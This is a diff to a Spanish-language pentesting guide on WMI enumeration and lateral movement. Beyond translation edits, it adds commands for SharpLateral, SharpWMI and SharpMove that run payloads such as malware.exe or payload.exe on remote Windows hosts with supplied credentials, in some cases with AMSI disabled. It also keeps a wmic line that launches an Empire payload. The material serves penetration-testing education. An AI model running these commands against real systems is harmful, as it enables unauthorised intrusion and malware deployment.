@@ -6,13 +6,13 @@
 
 Los procesos pueden abrirse en hosts donde se conocen el nombre de usuario y la contraseña o hash a través del uso de WMI. Los comandos se ejecutan utilizando WMI mediante Wmiexec, proporcionando una experiencia de shell semi-interactiva.
 
-**dcomexec.py:** Utilizando diferentes puntos finales de DCOM, este script ofrece un shell semi-interactivo similar a wmiexec.py, aprovechando específicamente el objeto DCOM ShellBrowserWindow. Actualmente es compatible con MMC20. Objetos de Aplicación, Ventanas de Shell y Ventana del Navegador de Shell. (source: [Hacking Articles](https://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/))
+**dcomexec.py:** Utilizando diferentes puntos finales de DCOM, este script ofrece un shell semi-interactivo similar a wmiexec.py, aprovechando específicamente el objeto DCOM ShellBrowserWindow. Actualmente es compatible con MMC20. Application, Shell Windows y Shell Browser Window objects. (source: [Hacking Articles](https://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/))
 
 ## Fundamentos de WMI
 
 ### Espacio de Nombres
 
-Estructurado en una jerarquía de estilo de directorio, el contenedor de nivel superior de WMI es \root, bajo el cual se organizan directorios adicionales, denominados espacios de nombres.  
+Estructurado en una jerarquía de estilo de directorio, el contenedor de nivel superior de WMI es \root, bajo el cual se organizan directorios adicionales, denominados espacios de nombres.
 Comandos para listar espacios de nombres:
 ```bash
 # Retrieval of Root namespaces
@@ -57,7 +57,7 @@ $c.methods
 # Method listing and invocation
 Invoke-WmiMethod -Class win32_share -Name Create -ArgumentList @($null, "Description", $null, "Name", $null, "c:\share\path",0)
 ```
-## Enumeración WMI
+## Enumeración de WMI
 
 ### Estado del Servicio WMI
 
@@ -87,7 +87,7 @@ wmic sysaccount list /format:list
 ```
 La consulta remota de WMI para información específica, como administradores locales o usuarios conectados, es factible con una construcción cuidadosa de comandos.
 
-### **Consulta Remota WMI Manual**
+### **Consulta WMI Remota Manual**
 
 La identificación sigilosa de administradores locales en una máquina remota y usuarios conectados se puede lograr a través de consultas WMI específicas. `wmic` también admite la lectura de un archivo de texto para ejecutar comandos en múltiples nodos simultáneamente.
 
@@ -97,14 +97,30 @@ wmic /node:hostname /user:user path win32_process call create "empire launcher s
 ```
 Este proceso ilustra la capacidad de WMI para la ejecución remota y la enumeración del sistema, destacando su utilidad tanto para la administración del sistema como para el pentesting.
 
-## Referencias
-
-- [https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)
-
 ## Herramientas Automáticas
 
 - [**SharpLateral**](https://github.com/mertdas/SharpLateral):
 ```bash
 SharpLateral redwmi HOSTNAME C:\\Users\\Administrator\\Desktop\\malware.exe
 ```
+- [**SharpWMI**](https://github.com/GhostPack/SharpWMI)
+```bash
+SharpWMI.exe action=exec [computername=HOST[,HOST2,...]] command=""C:\\temp\\process.exe [args]"" [amsi=disable] [result=true]
+# Stealthier execution with VBS
+SharpWMI.exe action=executevbs [computername=HOST[,HOST2,...]] [script-specification] [eventname=blah] [amsi=disable] [time-specs]
+```
+- [**https://github.com/0xthirteen/SharpMove**](https://github.com/0xthirteen/SharpMove):
+```bash
+SharpMove.exe action=query computername=remote.host.local query="select * from win32_process" username=domain\user password=password
+SharpMove.exe action=create computername=remote.host.local command="C:\windows\temp\payload.exe" amsi=true username=domain\user password=password
+SharpMove.exe action=executevbs computername=remote.host.local eventname=Debug amsi=true username=domain\\user password=password
+```
+- También podrías usar **Impacket's `wmiexec`**.
+
+
+## Referencias
+
+- [https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)
+
+
 {{#include ../../banners/hacktricks-training.md}}
